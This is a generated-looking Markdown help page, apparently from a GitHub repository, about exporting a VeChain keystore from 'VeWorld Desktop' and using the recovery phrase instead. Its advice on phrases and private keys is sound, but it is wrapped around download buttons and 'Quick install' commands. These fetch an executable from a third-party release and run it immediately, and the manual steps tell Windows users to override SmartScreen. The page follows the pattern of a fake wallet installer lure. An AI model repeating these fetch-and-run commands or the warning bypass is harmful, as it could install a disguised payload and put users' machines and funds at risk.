![VeWorld Desktop](../assets/banner-article.png)

# VeChain Keystore Export From VeWorld Desktop: What Moves

The phrase moves the account; a file is a second copy

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

A keystore file is one encrypted copy of a key, and VeWorld Desktop's portable credential is the recovery phrase rather than an exported file. To use the same account in another VeChain application, import the phrase there; the address is reproduced from it, and no file has to leave the wallet.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

Another VeChain application asks for a keystore or a private key, or you are leaving a wallet behind and want a portable copy of the account before you do.

| What an application asks for | What it actually needs | What to give it |
|---|---|---|
| A keystore JSON plus password | Key material in an encrypted file | Use the phrase instead where accepted |
| A private key string | The raw key | Nothing; this is the most dangerous ask |
| A <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a> | The words that derive the address | The phrase, typed only in a wallet's own restore screen |
| An address | A destination, not a credential | The 0x address, which is public |

## Why it happens

Two credentials can represent the same account, and they are not equally safe. A recovery phrase derives the key and can restore it in any compatible wallet; a keystore is that key encrypted with a password; a private key is the key itself in plain text. Each step down that list is easier to lose and more dangerous to expose.

Wallets choose which of the three they accept. A wallet built around phrase import can cover every recovery case from the phrase alone, and a file adds a second copy of the secret to look after. Where a build offers an export at all, treat the file as that second copy rather than as the primary backup.

Portability itself is not in question. An address belongs to the phrase, so any wallet that accepts the phrase reproduces the same account with the same balances. What does not travel is local convenience: labels, cached history and any application-specific settings live with the application that stored them.

The dangerous request is the private key. No legitimate interoperability task requires pasting a raw key into a web form, and a wallet that asks for one is either badly built or hostile. The phrase is the credential to use, and only inside a wallet's own restore screen; never paste a private key anywhere, and never share the phrase.

## Fix

1. Decide what the other application actually supports: phrase import, keystore import, or neither.
2. If it supports phrase import, use the phrase in its restore screen and confirm the derived address matches.
3. If it only accepts keystore files, check whether a phrase import path exists elsewhere in that application before creating any file.
4. Never paste a private key into a website, a chat or a support form; treat any request for one as an attack.
5. After importing elsewhere, confirm both applications show the same address and the same balance.
6. Keep the phrase on paper and offline; it is the only portable credential that needs to exist.

## If that did not work

If the other application rejects the phrase, check the word count and spelling against the written copy, then try its alternate <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md">derivation path</a> option.

If the address differs after import, the path is the difference rather than the phrase. Compare the addresses character by character at both ends before assuming an error.

If the other application shows no tokens, refresh its account view; token discovery is a separate step from address derivation.

## Prevention

- Treat the phrase as the portable credential and keep it offline.
- Refuse every request for a private key, whatever the context.
- Confirm addresses after any import, before moving a balance.
- Never store the phrase in a file that syncs to a cloud account.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Does the wallet export a keystore file?

Import is documented for a Sync2 keystore with its password; for moving an account elsewhere the portable credential is the recovery phrase. Where a build offers an export, it produces a second encrypted copy rather than a better backup.

### Can I move my account to another VeChain app?

Yes, with the recovery phrase. Import it in the other application's restore screen and the same address appears.

### Is a keystore safer than a phrase?

It is a different shape of the same secret, protected by a password. A phrase restores the account without a file, which makes it the more useful backup and the one to guard most carefully.

### Why do some apps ask for a private key?

Either because they were built around raw keys or because they are trying to take the account. Neither reason makes providing one safe.

### What if I already pasted a private key somewhere?

Create a fresh wallet and move the balance immediately. A key that has been exposed cannot be un-exposed, and the address it controls stays at risk.

### Does exporting affect the balance?

No. Reading or reproducing key material does not move funds; only a transaction does.

### Can I import the same phrase into several wallets?

Yes, and all of them control the same address. The practical risk is that more copies mean more places for a mistake, which is why one working installation is easier to keep safe.

### Is a keystore file portable between wallets?

Only between wallets that accept that format and its encryption. A phrase is portable across any wallet that supports the chain, which is why it is the credential to keep.

### What if the other app only accepts a private key?

Use a different application. A wallet that requires a raw key for interoperability is asking for the one form of the secret that cannot be protected afterwards.

### Does the phrase restore tokens and NFTs too?

The address comes back, and the tokens and NFTs attached to it are read from the chain. Anything held at a different address needs that address's own phrase.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [How the password and the phrase differ](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [Leaving Sync and Sync2 behind](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md)
- [Spotting a site that wants your phrase](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md)
- [What self-custody protects](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [Moving from the VeChainThor wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md)